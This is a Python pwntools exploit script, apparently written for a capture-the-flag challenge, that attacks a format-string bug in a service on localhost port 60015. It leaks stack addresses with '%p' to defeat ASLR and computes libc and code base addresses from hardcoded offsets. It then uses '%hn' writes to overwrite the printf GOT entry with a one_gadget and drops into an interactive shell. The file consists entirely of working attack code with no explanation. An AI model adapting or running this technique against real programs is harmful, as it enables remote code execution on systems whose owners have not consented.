#!/usr/bin/env python
from pwn import *

p = remote('localhost', 60015)

print(p.recv())

p.sendline("%p " * 150)

string = ''

while True:
    string += p.recv()
    if 'affiliation' in string:
        break

print(string)

one_code_address = int(string.split(' ')[-6], 16)

one_libc_address = int(string.split(' ')[2], 16)

print("One code address:  ", hex(one_code_address))

print("Libc code address: ", hex(one_libc_address))

#i =

code_base_address = one_code_address & 0xfffffffffffff000

libc_base_address = (one_libc_address & 0xffffffffffffffff) - 0x3c6780

libc_system = libc_base_address + 0x45216 #one_gadget

#libc_system = libc_base_address + 0x55800 + 0x10470

print("One code Base:  ", hex(code_base_address))

print("Libc code Base: ", hex(libc_base_address))

offset = 0x20133f
#0x20131f

got_printf = code_base_address + offset #0x202028

code_base_address += 0

libc_base_address += 0

lower_16_system = libc_system & 0xffff

vfirst = lower_16_system
first = vfirst

vsecond = ((libc_system >> 16) & 0xffff)
second = vsecond - vfirst

while second < 0:
    second += 0x10000

vthird = ((libc_system >> 32) & 0xffff)
third = vthird - vsecond

while third < 0:
    third += 0x10000

print(hex(got_printf))
print(hex(libc_system))
print(hex(first))
print(hex(second))
print(hex(third))

buf = "%" + "%05d" % first + "x"
buf += "%11$hn"
buf += "%" + "%05d" % second + "x"
buf += "%12$hn"
buf += "%" + "%05d" % third + "x"
buf += "%13$hnA"
buf += p64(got_printf) + p64(got_printf + 2) + p64(got_printf + 4)

print(buf)

#buf = "%8$sAAAA"
#buf += p64(code_base_address) + p64(libc_base_address)

p.sendline(buf)

#data = p.recv()
#data = p.recv()

#print(repr(data))

p.interactive()
